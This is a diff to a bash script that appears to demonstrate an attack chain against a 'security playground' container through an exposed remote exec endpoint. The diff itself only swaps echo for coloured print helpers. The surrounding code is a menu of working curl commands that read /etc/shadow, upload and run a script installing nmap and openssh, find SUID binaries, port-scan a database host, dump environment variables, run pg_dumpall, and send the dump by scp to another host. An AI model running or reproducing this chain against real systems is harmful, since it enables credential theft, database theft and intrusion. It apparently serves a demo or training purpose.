@@ -3,8 +3,22 @@
 read -p "What is the http address of your target? [http://192.168.1.59]: "  sec_playground_url
 sec_playground_url=${sec_playground_url:-http://192.168.1.59}
 
+printy() {
+  printf "\e[33;1m%s\n" "$1"
+}
+printg() {
+  printf "\e[32m$1\e[m\n"
+}
+printr() {
+  echo -e "\033[1;31m$1\033[0m"
+}
+
+printb() {
+  echo -e "\033[0m"
+}
+
 function read_sensitive_file() {
-    echo "********************************************************************************"
+    printg "********************************************************************************"
     echo ""
 	echo "Reading /etc/shadow from remote service... "
     echo "The following curl command is about to be run, press any key to continue..."
@@ -14,11 +28,11 @@ function read_sensitive_file() {
     read
     echo "--------------------------------------------------------------------------------"
 	curl ${sec_playground_url}/etc/shadow
-	echo "********************************************************************************"
+	printg "********************************************************************************"
 }
 
 function upload_file() {
-    echo "********************************************************************************"
+    printg "********************************************************************************"
     echo ""
 	echo "Uploading file to /tmp/ "
     echo "The following curl command is about to be run, press any key to continue..."
@@ -29,11 +43,11 @@ function upload_file() {
     echo "--------------------------------------------------------------------------------"
 	curl -X POST ${sec_playground_url}/tmp/bad_script.sh -d content="apk add nmap openssh"
     echo ""
-	echo "********************************************************************************"
+	printg "********************************************************************************"
 }
 
 function exec_bad_script() {
-    echo "********************************************************************************"
+    printg "********************************************************************************"
 	echo "Installing nmap and scp in remote contianer... "
     echo "The following curl command is about to be run, press any key to continue..."
     echo "Command: curl -X POST ${sec_playground_url}/exec -d 'command=sh /tmp/bad_script.sh'"
@@ -42,11 +56,11 @@ function exec_bad_script() {
     read
     echo "--------------------------------------------------------------------------------"
 	curl -X POST ${sec_playground_url}/exec -d 'command=sh /tmp/bad_script.sh'
-    echo "********************************************************************************"
+    printg "********************************************************************************"
 }
 
 function find_suid_binaries() {
-    echo "********************************************************************************"
+    printg "********************************************************************************"
 	echo "Find SUID Binaries... "
     echo "The following curl command is about to be run, press any key to continue..."
     echo "Command: curl -X POST ${sec_playground_url}/exec -d 'command=find / -perm -u=s -type f 2>/dev/null'"
@@ -55,12 +69,12 @@ function find_suid_binaries() {
     read
     echo "--------------------------------------------------------------------------------"
 	curl -X POST ${sec_playground_url}/exec -d 'command=find / -perm -u=s -type f 2>/dev/null'
-    echo "********************************************************************************"
+    printg "********************************************************************************"
 }
 
 
 function port_scan() {
-    echo "********************************************************************************"
+    printg "********************************************************************************"
 	echo "Run Port Scan... "
     echo "The following curl command is about to be run:"
     echo "Command: curl -X POST ${sec_playground_url}/exec -d 'command=nmap -Pn -p 5432 appdb'"
@@ -69,11 +83,11 @@ function port_scan() {
     read
     echo "--------------------------------------------------------------------------------"
 	curl -X POST ${sec_playground_url}/exec -d 'command=nmap -Pn -p 5432 appdb'
-    echo "********************************************************************************"
+    printg "********************************************************************************"
 }
 
 function dump_env_var() {
-    echo "********************************************************************************"
+    printg "********************************************************************************"
 	echo "Dump Environment Variables... "
     echo "The following curl command is about to be run, press any key to continue..."
     echo "Command: curl -X POST ${sec_playground_url}/exec -d 'command=printenv'"
@@ -82,7 +96,7 @@ function dump_env_var() {
     read
     echo "--------------------------------------------------------------------------------"
 	curl -X POST ${sec_playground_url}/exec -d 'command=printenv'
-    echo "********************************************************************************"
+    printg "********************************************************************************"
 }
 
 function install_psql_tools() {
@@ -99,7 +113,7 @@ function install_psql_tools() {
 }
 
 function dump_db() {
-    echo "********************************************************************************"
+    printg "********************************************************************************"
 	echo "Dump all Databases... "
     echo "The following curl command is about to be run, press any key to continue..."
     echo "Command: curl -X POST ${sec_playground_url}/exec -d 'command=pg_dumpall -f /tmp/db_dump.tar;ls -la /tmp/''"
@@ -108,11 +122,11 @@ function dump_db() {
     read
     echo "--------------------------------------------------------------------------------"
 	curl -X POST ${sec_playground_url}/exec -d 'command=pg_dumpall -f /tmp/db_dump.tar;ls -la /tmp/'
-    echo "********************************************************************************"
+    printg "********************************************************************************"
 }
 
 function exfiltrate_data() {
-    echo "********************************************************************************"
+    printg "********************************************************************************"
 	echo "Exfiltrate Data... "
     echo "The following curl command is about to be run, press any key to continue..."
     echo "Command: curl -X POST ${sec_playground_url}/exec -d 'command=scp -r /tmp/db_dump.tar test@192.168.1.51:/tmp/db_dump.tar'"
@@ -121,13 +135,12 @@ function exfiltrate_data() {
     read
 	echo "--------------------------------------------------------------------------------"
     curl -X POST ${sec_playground_url}/exec -d 'command=scp -r /tmp/db_dump.tar test@192.168.1.51:/tmp/db_dump.tar'
-    echo "********************************************************************************"
+    printg "********************************************************************************"
 }
 
 
 menu(){
 echo -ne "
-********************************************************************************
 Select an Exploit:
 1) Read Sensitive File
 2) Write script to /tmp
